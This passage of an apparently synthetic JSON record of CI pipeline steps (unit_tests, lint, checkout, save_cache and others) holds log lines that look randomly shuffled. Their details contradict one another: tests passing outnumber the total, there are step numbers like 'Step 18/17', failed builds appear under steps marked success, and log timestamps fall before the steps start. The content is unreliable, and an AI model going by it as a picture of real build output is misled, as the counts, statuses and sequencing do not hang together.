          "[12:45:59] DEBUG: Connection pool: 2 active",
          "npm notice: package.json updated",
          "Pushing to registry...",
          "Cache restored successfully (234MB)",
          "Cache invalidated: node_modules",
          "Compiling lib/main.py...",
          "Done.",
          "[12:45:59] WARN: Deprecated API usage",
          "Image pulled successfully",
          "NODE_ENV=development",
          "[12:45:59] INFO: Processing request",
          "Waiting...",
          "Already up to date.",
          "Finished.",
          "[12:45:59] INFO: Starting build process",
          "Loading...",
          "Tests: 106 passed, 297 total",
          "Ready.",
          "Compiling lib/app.ts...",
          "Step 5/16: Testing",
          "Installing jest@5.3.2",
          "[12:45:59] DEBUG: Connection pool: 17 active",
          "[12:45:59] DEBUG: Connection pool: 19 active",
          "pip: Installing build dependencies...",
          "Ready.",
          "Waiting...",
          "Loading...",
          "Step 1/18: Linting",
          "Artifact downloaded: 18MB",
          "pip: Downloading react-2.4.tar.gz",
          "\u2713 Task completed in 4896ms",
          "Fetching submodules...",
          "Success!",
          "npm install: added 435 packages",
          "Done.",
          "  PASS: test_cache_hit (44ms)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Cache hit for key-2649",
          "Pulling image: python:3.11",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:45:59] INFO: Request completed",
          "Compiling src/index.js...",
          "Transforming 990 files...",
          "[12:45:59] INFO: Processing request",
          "Using Node.js 16.3.1",
          "Snapshots: 22 passed, 10 total",
          "Uploading artifact 'build' (28 files)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-15T12:47:28.137905",
        "finished_at": "2025-12-15T12:47:59.835379",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Compiling components/app.ts...",
          "Verifying...",
          "Finished.",
          "WARNING: express has known vulnerabilities",
          "TLS handshake completed",
          "Switched to branch 'bugfix/task-568'",
          "npm notice: created a lockfile",
          "Installing axios@1.13.10",
          "Completed.",
          "Loading...",
          "npm install: added 358 packages",
          "Uploading artifact 'build' (29 files)",
          "FAILED: test_auth_login",
          "Optimizing 33 modules...",
          "GET /api - 200 (3ms)",
          "WARNING: express has known vulnerabilities",
          "Ready.",
          "Cache saved successfully",
          "WARNING: lodash has known vulnerabilities",
          "[12:45:59] DEBUG: Initializing service",
          "Step 16/17: Building",
          "Ready.",
          "[12:45:59] WARN: Deprecated API usage",
          "[12:45:59] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "Switched to branch 'bugfix/task-123'",
          "Done.",
          "Processing...",
          "Loading...",
          "TLS handshake completed",
          "Minifying app.js",
          "Already up to date.",
          "Tests: 163 passed, 291 total",
          "Pulling image: python:18",
          "[12:45:59] INFO: Starting build process",
          "Pushing to registry...",
          "Already up to date.",
          "Optimizing 74 modules...",
          "Checking out main branch",
          "Generating source maps...",
          "Cache miss for key-2593",
          "FAILED: test_api_health",
          "  PASS: test_cache_hit (325ms)",
          "WARNING: express has known vulnerabilities",
          "Cache hit for key-8344",
          "Using Node.js 15.13.10",
          "Artifact uploaded: dist.zip (40MB)",
          "Snapshots: 11 passed, 13 total",
          "[12:45:59] ERROR: Connection failed",
          "npm install: resolved 1311 packages",
          "Compiling utils/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Generating source maps...",
          "Cache invalidated: dependencies",
          "Bundling main.js",
          "WARNING: webpack has known vulnerabilities",
          "[12:45:59] INFO: Processing request",
          "\u2713 Step 'checkout' succeeded",
          "Creating production build...",
          "[12:45:59] DEBUG: Connection pool: 13 active",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Compiling lib/handler.rs...",
          "pip: Collecting jest",
          "Pulling image: node:18",
          "OK",
          "[12:45:59] ERROR: Connection failed",
          "Environment: development",
          "Compiling src/app.ts...",
          "\u2713 Task completed in 3773ms",
          "\u2713 Step 'checkout' succeeded",
          "npm install: added 287 packages",
          "NODE_ENV=development",
          "Cache saved successfully",
          "[12:45:59] INFO: Starting build process",
          "Checking out main branch",
          "Cache invalidated: node_modules",
          "[12:45:59] DEBUG: Initializing service",
          "Verifying...",
          "Step 4/22: Deploying",
          "[12:45:59] INFO: Connecting to database",
          "Checking out master branch",
          "\u2713 Step 'build' succeeded",
          "[12:45:59] DEBUG: Connection pool: 8 active",
          "OK",
          "Bundling runtime.js",
          "Cache hit for key-8034",
          "HEAD is now at 6362d9b",
          "Transforming 714 files...",
          "Step 17/22: Running migrations",
          "  PASS: e2e/test_auth_login.spec.js",
          "Time: 108.313s",
          "Layer 6/11: RUN command",
          "Step 5/15: Linting",
          "HEAD is now at 83c70c5",
          "pip install: Successfully installed eslint-3.12",
          "Step 8/21: Installing dependencies",
          "[12:45:59] DEBUG: Initializing service",
          "Done.",
          "Artifact uploaded: build.tar.gz (20MB)",
          "npm notice: created a lockfile",
          "pip install: Successfully installed react-1.0",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Transforming 334 files...",
          "pip: Downloading prettier-1.17.tar.gz",
          "pip: Installing build dependencies...",
          "\u2713 Step 'install' succeeded",
          "Test Suites: 46 passed, 50 total",
          "Using Python 3.11",
          "pip: Installing build dependencies...",
          "Using Python 3.12",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Uploading artifact 'build' (11 files)",
          "\u2713 Task completed in 2814ms",
          "npm notice: created a lockfile",
          "[12:45:59] WARN: Deprecated API usage",
          "Optimizing 49 modules...",
          "Waiting...",
          "Cache restored successfully (131MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Finished.",
          "\u2713 Task completed in 2607ms",
          "TLS handshake completed",
          "Artifact uploaded: build.tar.gz (26MB)",
          "\u2713 Task completed in 820ms",
          "npm install: resolved 297 packages",
          "Transforming 500 files...",
          "Waiting...",
          "\u2713 Step 'install' succeeded",
          "Connection established",
          "[12:45:59] DEBUG: Connection pool: 7 active",
          "Creating production build...",
          "GET /health - 204 (22ms)",
          "WARNING: express has known vulnerabilities",
          "Done.",
          "WARNING: express has known vulnerabilities",
          "Tests: 268 passed, 68 total",
          "Pulling image: python:latest",
          "Compiling lib/index.js...",
          "Using Python 3.11",
          "Cache invalidated: node_modules",
          "Exception: ValueError",
          "[12:45:59] DEBUG: Query executed in 21ms",
          "NODE_ENV=production",
          "Waiting...",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-15T12:47:59.835379",
        "finished_at": "2025-12-15T12:48:06.174874",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Using Node.js 16.15.5",
          "Generating source maps...",
          "Step 6/16: Installing dependencies",
          "Artifact uploaded: dist.zip (42MB)",
          "OK",
          "\u2713 validate completed",
          "pip: Installing build dependencies...",
          "Cache miss for key-6530",
          "Uploading artifact 'coverage' (23 files)",
          "NODE_ENV=test",
          "Cache saved successfully",
          "\u2713 All checks passed",
          "Ready.",
          "GET /api - 201 (1ms)",
          "Using Node.js 16.7.5",
          "Cache invalidated: build",
          "pip: Installing build dependencies...",
          "[12:45:59] DEBUG: Query executed in 69ms",
          "Compiling lib/handler.rs...",
          "Compiling lib/service.java...",
          "Pushing to registry...",
          "Cache saved successfully",
          "Compiling components/service.java...",
          "Artifact downloaded: 48MB",
          "Cache saved successfully",
          "Installing eslint@3.4.5",
          "Step 19/22: Testing",
          "Compiling components/service.java...",
          "npm install: resolved 149 packages",
          "Checking out master branch",
          "Connection established",
          "Ready.",
          "[12:45:59] INFO: Cache refreshed",
          "Step 18/17: Linting",
          "Environment: production",
          "Switched to branch 'hotfix/task-282'",
          "[12:45:59] DEBUG: Initializing service",
          "Cache invalidated: node_modules",
          "Environment: production",
          "Environment: development",
          "[12:45:59] INFO: Starting build process",
          "WARNING: axios has known vulnerabilities",
          "\u2713 deploy completed",
          "\u2713 All checks passed",
          "GET /health - 200 (96ms)",
          "\u2713 build completed",
          "Step 12/20: Testing",
          "Using Python 3.11",
          "pip: Downloading eslint-4.1.tar.gz",
          "[12:45:59] WARN: Deprecated API usage",
          "Compiling utils/handler.rs...",
          "Time: 83.831s",
          "Cache restored successfully (312MB)",
          "Uploading artifact 'dist' (11 files)",
          "[12:45:59] WARN: Deprecated API usage",
          "Transforming 467 files...",
          "Pushing to registry...",
          "Pushing to registry...",
          "Environment: staging",
          "Step 1/18: Linting",
          "Pushing to registry...",
          "Ready.",
          "Snapshots: 43 passed, 22 total",
          "WARNING: prettier has known vulnerabilities",
          "Cache saved successfully",
          "Time: 3.837s",
          "Snapshots: 32 passed, 46 total",
          "npm notice: package.json updated",
          "Already up to date.",
          "[12:45:59] DEBUG: Query executed in 24ms",
          "Tests: 132 passed, 423 total",
          "[12:45:59] DEBUG: Loading configuration",
          "\u2717 build failed with exit code 56",
          "GET /health - 200 (63ms)",
          "pip: Collecting eslint",
          "  PASS: unit/test_cache_hit.spec.js",
          "npm install: added 168 packages",
          "Step 4/24: Installing dependencies",
          "\u2713 All checks passed",
          "Minifying vendor.js",
          "Artifact downloaded: 35MB",
          "Using Node.js 14.20.6",
          "GET /health - 204 (2ms)",
          "Connection established",
          "Building Docker image...",
          "Already up to date.",
          "\u2713 package completed",
          "  PASS: test_cache_hit (406ms)",
          "Uploading artifact 'coverage' (18 files)",
          "Fetching submodules...",
          "WARNING: express has known vulnerabilities",
          "Platform: darwin-arm64",
          "[12:45:59] INFO: Starting build process",
          "OK",
          "npm install: resolved 642 packages",
          "[12:45:59] WARN: Deprecated API usage",
          "Fetching from https://gcr.io/package.json",
          "Compiling utils/utils.go...",
          "NODE_ENV=test",
          "Completed.",
          "[12:45:59] INFO: Starting build process",
          "Step 12/25: Building",
          "Installing eslint@4.19.7",
          "Step 10/23: Deploying",
          "[12:45:59] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Fetching from https://googleapis.com/package.json",
          "Platform: win32-x64",
          "npm install: resolved 561 packages",
          "[12:45:59] DEBUG: Connection pool: 1 active",
          "[12:45:59] INFO: Request completed",
          "pip install: Successfully installed react-2.7",
          "Step 15/24: Linting",
          "Using Node.js 19.7.5",
          "pip install: Successfully installed eslint-5.14",
          "Finished.",
          "[12:45:59] DEBUG: Query executed in 32ms",
          "Completed.",
          "Step 9/25: Building",
          "Tests: 226 passed, 278 total",
          "Layer 8/11: ENV command",
          "Fetching from https://registry.npmjs.org/package.json",
          "pip: Installing build dependencies...",
          "Fetching submodules...",
          "Transforming 937 files...",
          "Compiling utils/index.js...",
          "FAILED: test_cache_hit",
          "Coverage: 100% statements, 66% branches",
          "WARNING: express has known vulnerabilities",
          "[12:45:59] INFO: Processing request",
          "  PASS: test_api_health (209ms)",
          "Artifact uploaded: dist.zip (38MB)",
          "[12:45:59] INFO: Connecting to database",
          "OK",
          "[12:45:59] INFO: Connecting to database",
          "\u2713 Step 'checkout' succeeded",
          "Snapshots: 32 passed, 1 total",
          "[12:45:59] INFO: Starting build process",
          "GET /health - 200 (48ms)",
          "Optimizing 28 modules...",
          "Tests: 106 passed, 282 total",
          "Transforming 642 files...",
          "Already up to date.",
          "yarn add: Done in 1.97s",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-15T12:48:06.174874",
        "finished_at": "2025-12-15T12:48:16.740699",
        "log_lines": [
          "=== Step: lint ===",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:45:59] DEBUG: Initializing service",
          "HEAD is now at 41388a8",
          "[12:45:59] ERROR: Connection failed",
          "Pushing to registry...",
          "Done.",
          "[12:45:59] DEBUG: Connection pool: 4 active",
          "Optimizing 69 modules...",
          "Optimizing 84 modules...",
          "Transforming 328 files...",
          "Step 7/24: Testing",
          "Generating source maps...",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm notice: created a lockfile",
          "Processing...",
          "Building Docker image...",
          "Ran 91 tests in 4s",
          "[12:45:59] WARN: Deprecated API usage",
          "Using Python 3.9",
          "yarn add: Done in 14.47s",
          "Step 4/21: Linting",
          "Coverage: 72% statements, 62% branches",
          "Already up to date.",
          "Artifact uploaded: dist.zip (1MB)",
          "Done.",
          "Step 9/17: Deploying",
          "Fetching submodules...",
          "Building Docker image...",
          "WARNING: express has known vulnerabilities",
          "Waiting...",
          "npm install: added 312 packages",
          "\u2713 validate completed",
          "[12:45:59] INFO: Cache refreshed",
          "Bundling runtime.css",
          "Step 14/21: Installing dependencies",
          "\u2713 deploy completed",
          "Finished.",
          "Tests: 136 passed, 330 total",
          "Pulling image: python:18",
          "npm notice: created a lockfile",
          "WARNING: eslint has known vulnerabilities",
          "[12:45:59] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Ran 22 tests in 45s",
          "Exception: RuntimeError",
          "Switched to branch 'feature/task-636'",
          "Fetching submodules...",
          "\u2717 build failed with exit code 107",
          "pip: Collecting webpack",
          "Switched to branch 'hotfix/task-219'",
          "Minifying main.js",
          "Compiling components/utils.go...",
          "Step 6/21: Building",
          "Artifact downloaded: 43MB",
          "Cache saved successfully",
          "Creating production build...",
          "Completed.",
          "pip: Installing build dependencies...",
          "  PASS: integration/test_db_connect.spec.js",
          "Step 7/18: Running migrations",
          "Cache saved successfully",
          "Test Suites: 17 passed, 46 total",
          "Uploading artifact 'coverage' (31 files)",
          "npm install: resolved 1265 packages",
          "Installing eslint@5.13.10",
          "Checking out master branch",
          "Compiling utils/service.java...",
          "Fetching from https://github.com/package.json",
          "[12:45:59] DEBUG: Loading configuration",
          "Loading...",
          "\u2713 All checks passed",
          "Completed.",
          "Platform: darwin-arm64",
          "TLS handshake completed",
          "Step 3/25: Deploying",
          "Bundling runtime.js",
          "Layer 7/8: COPY command",
          "pip: Downloading axios-5.3.tar.gz",
          "  PASS: e2e/test_user_create.spec.js",
          "Connection established",
          "[12:45:59] DEBUG: Connection pool: 12 active",
          "[12:45:59] INFO: Request completed",
          "Using Node.js 19.10.0",
          "POST /data - 202 (413ms)",
          "Optimizing 19 modules...",
          "Time: 23.585s",
          "Installing webpack@2.6.9",
          "POST /api - 202 (288ms)",
          "[12:45:59] INFO: Connecting to database",
          "Artifact uploaded: build.tar.gz (20MB)",
          "WARNING: prettier has known vulnerabilities",
          "Exception: NullPointerException",
          "Artifact uploaded: dist.zip (37MB)",
          "npm install: added 102 packages",
          "Cache invalidated: dependencies",
          "\u2713 Step 'test' succeeded",
          "\u2713 Step 'checkout' succeeded",
          "Exception: NullPointerException",
          "Waiting...",
          "Creating production build...",
          "Checking out develop branch",
          "[12:45:59] DEBUG: Query executed in 49ms",
          "Installing express@1.0.9",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache restored successfully (355MB)",
          "WARNING: prettier has known vulnerabilities",
          "Using Node.js 19.8.9",
          "Verifying...",
          "NODE_ENV=development",
          "pip: Downloading axios-5.4.tar.gz",
          "Minifying main.js",
          "OK",
          "Tests: 147 passed, 348 total",
          "Cache saved successfully",
          "Completed.",
          "Tests: 478 passed, 431 total",
          "POST /api - 201 (19ms)",
          "Creating production build...",
          "Success!",
          "[12:45:59] WARN: Deprecated API usage",
          "[12:45:59] DEBUG: Loading configuration",
          "npm install: added 165 packages",
          "Switched to branch 'bugfix/task-350'",
          "Cache invalidated: node_modules",
          "Platform: linux-x64",
          "\u2713 validate completed",
          "pip: Downloading axios-1.13.tar.gz",
          "\u2717 build failed with exit code 59",
          "\u2713 Task completed in 1991ms",
          "Pushing to registry...",
          "Waiting...",
          "Optimizing 37 modules...",
          "[12:45:59] INFO: Request completed",
          "Pushing to registry...",
          "Bundling vendor.js",
          "TLS handshake completed",
          "Connection established",
          "Bundling styles.css",
          "Step 3/20: Deploying",
          "WARNING: express has known vulnerabilities",
          "Layer 10/9: RUN command",
          "\u2717 build failed with exit code 125",
          "Platform: linux-x64",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-15T12:48:16.740699",
        "finished_at": "2025-12-15T12:48:27.306524",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Done.",
          "Bundling runtime.js",
          "TLS handshake completed",
          "Step 13/19: Building",
          "Snapshots: 9 passed, 0 total",
          "[12:45:59] DEBUG: Memory usage: 300MB",
          "Step 12/22: Running migrations",
          "[12:45:59] INFO: Request completed",
          "Compiling lib/utils.go...",
          "Ready.",
          "Cache saved successfully",
          "Bundling vendor.js",
          "Compiling src/service.java...",
          "Compiling utils/handler.rs...",
          "[12:45:59] DEBUG: Connection pool: 2 active",
          "Done.",
          "Transforming 462 files...",
          "npm install: resolved 1760 packages",
          "Compiling components/utils.go...",
          "Coverage: 95% statements, 67% branches",
          "pip: Downloading eslint-5.17.tar.gz",
          "OK",
          "Compiling components/app.ts...",
          "Cache saved successfully",
          "Time: 33.885s",
          "Fetching from https://npmjs.org/package.json",
          "Transforming 636 files...",
          "Compiling lib/main.py...",
          "Waiting...",
          "HEAD is now at b59706c",
          "Layer 2/11: RUN command",
          "Coverage: 79% statements, 84% branches",
          "Transforming 932 files...",
          "[12:45:59] INFO: Connecting to database",
          "Cache saved successfully",
          "FAILED: test_user_create",
          "npm notice: package.json updated",
          "Time: 104.244s",
          "Compiling src/utils.go...",
          "Success!",
          "pip install: Successfully installed jest-5.7",
          "Compiling src/utils.go...",
          "Installing lodash@2.2.4",
          "[12:45:59] INFO: Starting build process",
          "[12:45:59] INFO: Connecting to database",
          "  PASS: e2e/test_user_create.spec.js",
          "Finished.",
          "Verifying...",
          "npm install: resolved 1729 packages",
          "TLS handshake completed",
          "Pulling image: node:latest",
          "Switched to branch 'feature/task-837'",
          "GET /api - 200 (77ms)",
          "pip: Collecting axios",
          "WARNING: lodash has known vulnerabilities",
          "[12:45:59] WARN: Deprecated API usage",
          "Fetching from https://githubusercontent.com/package.json",
          "[12:45:59] DEBUG: Query executed in 17ms",
          "[12:45:59] INFO: Cache refreshed",
          "Ran 56 tests in 1s",
          "Step 14/24: Installing dependencies",
          "Step 2/17: Testing",
          "\u2713 All checks passed",
          "Artifact uploaded: dist.zip (74MB)",
          "Step 10/19: Running migrations",
          "Creating production build...",
          "Snapshots: 19 passed, 20 total",
          "NODE_ENV=test",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 1/24: Testing",
          "Fetching submodules...",
          "Compiling utils/index.js...",
          "[12:45:59] DEBUG: Initializing service",
          "\u2717 build failed with exit code 99",
          "npm install: added 441 packages",
          "Minifying main.js",
          "Cache invalidated: node_modules",
          "NODE_ENV=test",
          "HEAD is now at 9508b1d",
          "Generating source maps...",
          "  PASS: integration/test_user_create.spec.js",
          "Cache hit for key-8674",
          "Fetching from https://amazonaws.com/package.json",
          "Pushing to registry...",
          "[12:45:59] DEBUG: Loading configuration",
          "Platform: win32-x64",
          "Compiling src/app.ts...",
          "[12:45:59] INFO: Request completed",
          "Compiling lib/utils.go...",
          "Fetching submodules...",
          "Loading...",
          "Connection established",
          "Environment: test",
          "Artifact uploaded: dist.zip (4MB)",
          "[12:45:59] INFO: Request completed",
          "WARNING: prettier has known vulnerabilities",
          "npm install: added 143 packages",
          "[12:45:59] INFO: Starting build process",
          "Time: 39.149s",
          "\u2713 All checks passed",
          "Step 18/19: Testing",
          "pip: Installing build dependencies...",
          "Switched to branch 'hotfix/task-989'",
          "Artifact downloaded: 3MB",
          "Ready.",
          "Compiling lib/handler.rs...",
          "Installing webpack@5.18.0",
          "Image pulled successfully",
          "npm install: resolved 582 packages",
          "Step 7/25: Building",
          "Creating production build...",
          "[12:45:59] WARN: Deprecated API usage",
          "Step 8/23: Installing dependencies",
          "npm install: resolved 1331 packages",
          "Platform: linux-x64",
          "FAILED: test_cache_hit",
          "npm install: added 231 packages",
          "Step 19/20: Building",
          "[12:45:59] DEBUG: Loading configuration",
          "npm install: resolved 586 packages",
          "[12:45:59] WARN: Deprecated API usage",
          "Ready.",
          "[12:45:59] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "TLS handshake completed",
          "HEAD is now at 211c27d",
          "npm install: resolved 1435 packages",
          "Processing...",
          "pip: Downloading lodash-4.3.tar.gz",
          "[12:45:59] INFO: Cache refreshed",
          "Completed.",
          "[12:45:59] DEBUG: Loading configuration",
          "GET /api - 204 (4ms)",
          "Uploading artifact 'dist' (18 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Pulling image: alpine:latest",
          "Exception: NullPointerException",
          "Snapshots: 50 passed, 18 total",
          "[12:45:59] INFO: Processing request",
          "Finished.",
          "Switched to branch 'hotfix/task-721'",
          "Processing...",
          "[12:45:59] INFO: Starting build process",
          "[12:45:59] INFO: Starting build process",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-15T12:48:27.306524",
        "finished_at": "2025-12-15T12:48:31.532854",
        "log_lines": [
          "=== Step: checkout ===",
          "[12:45:59] WARN: Deprecated API usage",
          "\u2713 Step 'checkout' succeeded",
          "Compiling lib/handler.rs...",
          "Test Suites: 13 passed, 29 total",
          "Compiling lib/utils.go...",
          "[12:45:59] WARN: Deprecated API usage",
          "Time: 35.274s",
          "Cache miss for key-3862",
          "Completed.",
          "Exception: NullPointerException",
          "Platform: darwin-arm64",
          "Uploading artifact 'build' (30 files)",
          "pip install: Successfully installed eslint-3.10",
          "Bundling runtime.css",
          "Fetching submodules...",
          "Pulling image: python:3.11",
          "Cache hit for key-1303",
          "pip install: Successfully installed react-2.8",
          "[12:45:59] WARN: Deprecated API usage",
          "Cache restored successfully (201MB)",
          "Checking out main branch",
          "Step 2/15: Building",
          "[12:45:59] DEBUG: Loading configuration",
          "[12:45:59] DEBUG: Initializing service",
          "Bundling styles.js",
          "npm notice: package.json updated",
          "\u2713 All checks passed",
          "Compiling lib/handler.rs...",
          "[12:45:59] DEBUG: Memory usage: 480MB",
          "Waiting...",
          "[12:45:59] DEBUG: Initializing service",
          "Compiling utils/handler.rs...",
          "Snapshots: 29 passed, 41 total",
          "Fetching submodules...",
          "Artifact uploaded: dist.zip (85MB)",
          "Platform: win32-x64",
          "npm notice: package.json updated",
          "Transforming 156 files...",
          "Artifact uploaded: dist.zip (92MB)",
          "Uploading artifact 'build' (34 files)",
          "[12:45:59] DEBUG: Loading configuration",
          "FAILED: test_api_health",
          "\u2713 Step 'test' succeeded",
          "Test Suites: 48 passed, 37 total",
          "Artifact downloaded: 32MB",
          "HEAD is now at 1a8f652",
          "  PASS: unit/test_api_health.spec.js",
          "Done.",
          "[12:45:59] INFO: Connecting to database",
          "Processing...",
          "npm install: added 411 packages",
          "Cache invalidated: node_modules",
          "\u2713 All checks passed",
          "Fetching submodules...",
          "yarn add: Done in 2.83s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/app.ts...",
          "HEAD is now at 534adf9",
          "[12:45:59] INFO: Starting build process",
          "WARNING: axios has known vulnerabilities",
          "npm notice: created a lockfile",
          "  PASS: test_auth_login (420ms)",
          "Verifying...",
          "Ready.",
          "[12:45:59] WARN: Deprecated API usage",
          "Cache hit for key-2347",
          "Finished.",
          "Success!",
          "Image pulled successfully",
          "Fetching submodules...",
          "Artifact uploaded: dist.zip (75MB)",
          "Image pulled successfully",
          "pip: Collecting jest",
          "[12:45:59] DEBUG: Loading configuration",
          "TLS handshake completed",
          "WARNING: lodash has known vulnerabilities",
          "Generating source maps...",
          "Done.",
          "Cache miss for key-1630",
          "[12:45:59] DEBUG: Loading configuration",
          "NODE_ENV=development",
          "Cache saved successfully",
          "Loading...",
          "Cache saved successfully",
          "Step 2/20: Deploying",
          "yarn add: Done in 28.48s",
          "  PASS: integration/test_auth_login.spec.js",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm notice: created a lockfile",
          "WARNING: eslint has known vulnerabilities",
          "Platform: win32-x64",
          "Checking out master branch",
          "OK",
          "  PASS: test_auth_login (366ms)",
          "Step 1/19: Testing",
          "Step 17/15: Running migrations",
          "  PASS: test_api_health (377ms)",
          "Cache restored successfully (416MB)",
          "[12:45:59] DEBUG: Initializing service",
          "[12:45:59] INFO: Cache refreshed",
          "Step 14/24: Testing",
          "Artifact uploaded: dist.zip (13MB)",
          "Step 14/15: Installing dependencies",
          "Loading...",
          "[12:45:59] WARN: Deprecated API usage",
          "Bundling vendor.css",
          "npm install: resolved 1094 packages",
          "Cache miss for key-7471",
          "Fetching from https://githubusercontent.com/package.json",
          "NODE_ENV=test",
          "NODE_ENV=test",
          "  PASS: test_user_create (415ms)",
          "Step 5/16: Building",
          "Exception: NullPointerException",
          "Exception: TypeError",
          "npm install: added 355 packages",
          "Cache miss for key-5498",
          "  PASS: unit/test_cache_hit.spec.js",
          "Using Node.js 20.18.2",
          "yarn add: Done in 22.38s",
          "Step 10/20: Running migrations",
          "Test Suites: 44 passed, 35 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_db_connect (406ms)",
          "Loading...",
          "Cache saved successfully",
          "Finished.",
          "Uploading artifact 'coverage' (15 files)",
          "npm install: resolved 1700 packages",
          "Optimizing 89 modules...",
          "Platform: darwin-arm64",
          "WARNING: prettier has known vulnerabilities",
          "Step 5/22: Linting",
          "Bundling main.js",
          "NODE_ENV=test",
          "pip: Installing build dependencies...",
          "Done.",
          "Cache hit for key-3753",
          "pip: Downloading react-5.0.tar.gz",
          "Processing...",
          "Cache miss for key-8065",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-15T12:48:31.532854",
        "finished_at": "2025-12-15T12:48:37.872349",
        "log_lines": [
          "=== Step: save_cache ===",
          "Time: 115.799s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Tests: 320 passed, 359 total",
          "[12:45:59] DEBUG: Query executed in 32ms",
          "Compiling src/index.js...",
          "Creating production build...",
          "Step 14/18: Installing dependencies",
          "pip install: Successfully installed react-4.16",
          "Transforming 585 files...",
          "[12:45:59] ERROR: Connection failed",
          "Checking out master branch",
          "Artifact uploaded: dist.zip (23MB)",
          "Generating source maps...",
          "Switched to branch 'hotfix/task-762'",
          "Test Suites: 49 passed, 5 total",
          "TLS handshake completed",
          "Step 15/20: Running migrations",
          "Step 5/21: Linting",
          "\u2717 build failed with exit code 119",
          "GET /status - 200 (29ms)",
          "Minifying main.js",
          "Pushing to registry...",
          "Creating production build...",
          "WARNING: axios has known vulnerabilities",
          "Building Docker image...",
          "\u2713 Task completed in 395ms",
          "\u2717 build failed with exit code 123",
          "Time: 104.174s",
          "[12:45:59] DEBUG: Initializing service",
          "[12:45:59] DEBUG: Connection pool: 20 active",
          "[12:45:59] WARN: Deprecated API usage",
          "Success!",
          "pip: Downloading axios-4.19.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Test Suites: 42 passed, 47 total",
          "Step 17/18: Linting",
          "[12:45:59] INFO: Starting build process",
          "npm install: resolved 438 packages",
          "Finished.",
          "Checking out master branch",
          "Minifying app.js",
          "Compiling utils/index.js...",
          "[12:45:59] DEBUG: Initializing service",
          "Compiling src/service.java...",
          "Compiling src/main.py...",
          "[12:45:59] DEBUG: Initializing service",
          "Compiling components/app.ts...",
          "NODE_ENV=development",
          "GET /api - 201 (38ms)",
          "Connection established",
          "Using Python 3.11",
          "Step 1/24: Testing",
          "Artifact downloaded: 37MB",
          "Building Docker image...",
          "Artifact downloaded: 5MB",
          "npm install: resolved 338 packages",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Platform: darwin-arm64",
          "Step 4/18: Deploying",
          "Coverage: 92% statements, 94% branches",
          "\u2717 build failed with exit code 15",
          "yarn add: Done in 1.91s",
          "Minifying vendor.js",
          "npm install: added 320 packages",
          "Step 20/23: Building",
          "Coverage: 76% statements, 98% branches",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Checking out develop branch",
          "[12:45:59] WARN: Deprecated API usage",
          "Using Node.js 17.8.0",
          "Finished.",
          "Cache hit for key-9422",
          "[12:45:59] INFO: Request completed",
          "WARNING: eslint has known vulnerabilities",
          "Artifact downloaded: 49MB",
          "npm notice: created a lockfile",
          "[12:45:59] DEBUG: Memory usage: 1204MB",
          "Ran 53 tests in 56s",
          "WARNING: prettier has known vulnerabilities",
          "\u2717 build failed with exit code 95",
          "Cache saved successfully",
          "Fetching submodules...",
          "Test Suites: 41 passed, 40 total",
          "[12:45:59] INFO: Connecting to database",
          "Bundling vendor.js",
          "Layer 7/9: ENV command",
          "Installing lodash@3.19.9",
          "Switched to branch 'feature/task-348'",
          "HEAD is now at 255d9b1",
          "Using Python 3.12",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_user_create (348ms)",
          "Fetching from https://docker.io/package.json",
          "Connection established",
          "Layer 6/14: RUN command",
          "Finished.",
          "Step 6/24: Installing dependencies",
          "Success!",
          "Cache restored successfully (164MB)",
          "npm install: resolved 896 packages",
          "Connection established",
          "yarn add: Done in 29.78s",
          "Step 12/15: Installing dependencies",
          "[12:45:59] DEBUG: Query executed in 29ms",
          "npm notice: created a lockfile",
          "[12:45:59] INFO: Request completed",
          "[12:45:59] ERROR: Connection failed",
          "Compiling src/main.py...",
          "Connection established",
          "Ran 141 tests in 19s",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "yarn add: Done in 9.50s",
          "Step 11/16: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Building Docker image...",
          "Cache invalidated: dependencies",
          "pip: Collecting webpack",
          "Compiling lib/utils.go...",
          "  PASS: test_auth_login (231ms)",
